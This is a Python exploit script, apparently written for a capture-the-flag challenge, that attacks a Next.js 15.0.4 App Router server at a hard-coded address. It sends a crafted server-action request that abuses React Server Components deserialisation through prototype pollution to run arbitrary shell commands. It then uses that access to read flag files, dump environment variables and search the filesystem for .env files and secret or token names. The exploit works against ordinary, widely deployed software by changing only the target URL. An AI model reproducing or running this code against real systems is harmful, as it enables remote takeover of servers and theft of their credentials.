#!/usr/bin/env python3

from __future__ import annotations

import base64
import json
import re
from pathlib import Path
from typing import Any

import requests


TARGET = "http://34.40.133.67:8080/"
OUTPUT_DIR = Path("old-web-raw")
OUTPUT_FILE = OUTPUT_DIR / "result.json"
FLAG_PATTERN = re.compile(rb"bushbash\{[^\r\n\x00}]{1,256}\}")
MAX_RESPONSE_BYTES = 512 * 1024


def run_command(command: str, label: str) -> dict[str, Any]:
    # The command is JSON-encoded into a JavaScript string and passed as an
    # argument to /bin/sh, avoiding interpolation into the shell source itself.
    encoded_command = json.dumps(command)
    prefix = (
        "var res=process.mainModule.require('child_process')"
        ".execFileSync('/bin/sh',['-c',"
        + encoded_command
        + "],{timeout:5000,maxBuffer:524288}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
    )

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk, separators=(",", ":"))),
        "1": (None, '"$@0"'),
    }

    result: dict[str, Any] = {
        "label": label,
        "command": command,
    }

    try:
        response = requests.post(
            TARGET,
            files=files,
            headers={
                "Next-Action": "x",
                "User-Agent": "Mozilla/5.0 (compatible; BushBash-CTF-React2Shell-check/1.0)",
                "Connection": "close",
            },
            timeout=(5, 12),
            allow_redirects=False,
        )
        body = response.content[:MAX_RESPONSE_BYTES]
        result.update(
            {
                "status": response.status_code,
                "headers": dict(response.headers),
                "body_length": len(response.content),
                "body_truncated": len(response.content) > len(body),
                "body_b64": base64.b64encode(body).decode("ascii"),
                "flags": sorted(
                    {
                        match.group(0).decode("ascii", errors="replace")
                        for match in FLAG_PATTERN.finditer(response.content)
                    }
                ),
            }
        )
    except Exception as error:
        result["error"] = f"{type(error).__name__}: {error}"

    return result


def main() -> None:
    results: dict[str, Any] = {
        "target": TARGET,
        "framework": "Next.js 15.0.4 App Router",
        "tests": [],
    }

    # Harmless capability marker first.
    results["tests"].append(run_command("printf R2S_OK_1504", "marker"))

    flag_command = (
        "cat /flag /flag.txt /app/flag /app/flag.txt /tmp/flag /tmp/flag.txt "
        "2>/dev/null; "
        "printenv FLAG 2>/dev/null; "
        "printenv | grep -o 'bushbash{[^}]*}' 2>/dev/null || true"
    )
    flag_result = run_command(flag_command, "standard_flag_locations")
    results["tests"].append(flag_result)

    if not flag_result.get("flags"):
        discovery_command = (
            "printf 'PWD='; pwd; "
            "printf '\\nCANDIDATES\\n'; "
            "find /app /workspace /tmp / -maxdepth 4 -type f "
            "\\( -iname '*flag*' -o -name '.env' -o -name 'package.json' \\) "
            "2>/dev/null | head -200; "
            "printf '\\nENV_NAMES\\n'; "
            "printenv | cut -d= -f1 | sort | grep -Ei 'flag|secret|key|token' || true"
        )
        results["tests"].append(run_command(discovery_command, "bounded_discovery"))

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_FILE.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")


if __name__ == "__main__":
    main()
